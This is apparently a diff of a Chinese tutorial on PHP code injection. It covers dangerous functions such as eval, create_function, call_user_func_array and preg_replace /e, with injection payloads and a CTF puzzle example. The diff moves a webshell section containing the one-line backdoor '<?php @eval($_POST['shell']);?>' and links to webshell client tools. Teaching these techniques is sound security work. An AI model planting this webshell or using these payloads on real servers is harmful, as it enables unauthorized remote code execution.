@@ -1,4 +1,4 @@
-# 代码注入
+# PHP代码注入
 
 ```php
 /**
@@ -20,7 +20,31 @@ eval("\$code;");
 http://example.com/?code=phpinfo();
 ```
 
+## PHP WebShell
 
+- 大马
+
+代码量较大，通过编程语言的相关函数实现文件管理、数据库管理和系统命令执行等功能。可以通过 [Github搜索](https://github.com/search?q=webshell+php&type=repositories) 获取 PHP 大马文件，但请注意辨别是否存在后门。
+
+![PHP大马](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/raw/master/screenshot.png)
+
+- 小马
+
+代码量小，通常只具备文件上传功能，用于下载大马。
+
+- **一句话木马**
+
+```php
+<?php @eval($_POST['shell']);?>
+```
+
+仅仅**一行代码**，配合如[中国菜刀](https://github.com/raddyfiy/caidao-official-version)，[中国蚁剑AntSword](https://github.com/AntSwordProject/antSword)、[哥斯拉Godzilla](https://github.com/BeichenDream/Godzilla)、[冰蝎Behinder](https://github.com/rebeyond/Behinder)、[Weevely](https://github.com/epinna/weevely3) 等 webshell 客户端工具使用。客户端通常具备文件管理、数据库管理和系统命令执行等功能。
+
+!> 中国菜刀是国内首个 webshell 管理工具，由于作者已停止更新并关闭官网，网络上存在许多带有后门的版本，大家在下载安装时需谨慎甄别。
+
+推荐使用中国蚁剑AntSword。
+
+![中国蚁剑](../../../assets/img/antsword.png)
 
 ## PHP代码执行相关函数
 
@@ -34,12 +58,11 @@ http://example.com/?code=phpinfo();
 |include_once()||
 |require()||
 |require_once()||
-|$_GET\['func_name'\]($_GET\['argument'\]);||
+|\$_GET\['func_name'\](\$_GET\['argument'\]);||
 
 
   // e does an eval() on the match
           // Create a function and use eval()
-
 
 
 $func = new ReflectionFunction($_GET['func_name']);
@@ -48,7 +71,6 @@ $func->invoke();
 $func->invokeArgs(array());
 
 // or serialize/unserialize function
-
 
 array_map()：将用户自定义函数作用到数组中的每个值上，并返回带有新值的数组
 
@@ -79,6 +101,7 @@ assert('phpinfo()')
 ?> 已自 PHP 7.2.0 起被废弃，并自 PHP 8.0.0 起被移除
 
 通过执行代码字符串创建动态函数，基本用法示例如下：
+
 ```php
 <?php
 /*
@@ -100,17 +123,20 @@ create_function($_GET['args'], $_GET['code'])
 ```
 
 上述代码的底层执行代码为
+
 ```php
 eval('function  __lambda_func (' . $_GET['args'] .') {' . $_GET['code'] . '} \0')
 ```
 
 若第一个参数可控，需闭合右圆括号和花括号，URL为`?args=){}phpinfo();//`
+
 ```php
 create_function('){}phpinfo();//', '')
 function  __lambda_func (){}phpinfo();//){$_GET['code']}\0
 ```
 
 若第二个参数可控，需闭合花括号，URL为`?code=}phpinfo();//`
+
 ```php
 create_function('','}phpinfo();//')
 function  __lambda_func () {}phpinfo();//}\0
@@ -120,9 +146,7 @@ function  __lambda_func () {}phpinfo();//}\0
 http://example.com/?code=}phpinfo();//
 ```
 
-
 例题：[Code-Breaking Puzzles](https://code-breaking.com/)的[easy-function](https://github.com/phith0n/code-breaking/tree/master/2018/function)
-
 
 ```php
 <?php
@@ -147,6 +171,7 @@ if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
     $action('', $arg); //
 }
 ```
+
 `$action`使用**命名空间**`\`绕过正则检测，`\create_function`;
 `create_function()`函数的第二个参数可控。
 
@@ -208,12 +233,12 @@ call_user_func_array($_GET['arg1'],$_GET['arg2'])
 // ?arg1=system&arg2[]=whoami
 // call_user_func_array('system', ['whoami']);
 ```
+
 ### [preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php)
 
 执行一个正则表达式的搜索和替换，如果设置模式修饰符`e`，则`$replacement`作为代码执行。
 
 ?> 模式修饰符`e`，已自 PHP 5.5 起被废弃，并自 PHP 7.0 起被移除
-
 
 ```php
 <?php
@@ -229,6 +254,7 @@ call_user_func_array($_GET['arg1'],$_GET['arg2'])
 $replacement = 'phpinfo()';
 preg_replace("/123/e", $replacement, "1234567");
 ```
+
 ### [array_map()](https://www.php.net/manual/zh/function.array-map.php)
 
 为数组的每个元素应用回调函数，基本用法示例：
@@ -252,6 +278,7 @@ print_r($b);
 ### [array_filter()](https://www.php.net/manual/zh/function.array-filter.php)
 
 使用回调函数过滤数组的元素
+
 ### [array_walk()](https://www.php.net/manual/zh/function.array-walk.php)
 
 ### [ob_start()](https://www.php.net/manual/zh/function.ob-start.php)
@@ -273,29 +300,7 @@ usort($_GET[1],'assert');
 usort(...$_GET);
 ```
 
-## PHP WebShell
 
-- 大马
-
-代码量大，通过利用编程语言的相关函数实现文件管理，数据库管理和执行系统命令等功能。可通过[Github](https://github.com/search?q=webshell+php&type=repositories)搜索获取PHP大马文件，请注意辨别是否存在后门。
-
-![PHP大马](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/raw/master/screenshot.png)
-
-- 小马
-
-代码量小，通常只具备文件上传功能，用于下载大马。
-
-- **一句话木马**
-
-```php
-<?php @eval($_POST['shell']);?>
-```
-
-仅**一行代码**，配合webshell客户端工具使用，如[中国菜刀](https://github.com/raddyfiy/caidao-official-version)，[中国蚁剑AntSword](https://github.com/AntSwordProject/antSword)、[哥斯拉Godzilla](https://github.com/BeichenDream/Godzilla)、[冰蝎Behinder](https://github.com/rebeyond/Behinder)、[Weevely](https://github.com/epinna/weevely3)等。客户端往往具备文件管理，数据库管理和执行系统命令等功能。
-
-!> 中国菜刀作为国内首个webshll工具，由于不再更新，作者已关闭官网，网络上有大量添加后门的版本，大家下载安装时注意甄别。
-
-![中国蚁剑](https://camo.githubusercontent.com/c52435cc7a5e6858f4ead7ad7403b951147ef8fea6b15e2e0edf086ef3645700/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032312f706e672f313539323137392f313631313832303130393033322d62353633343236652d303135632d346166652d613930352d3730653837386664636462362e706e67)
 
 ### 中国菜刀的流量分析
 
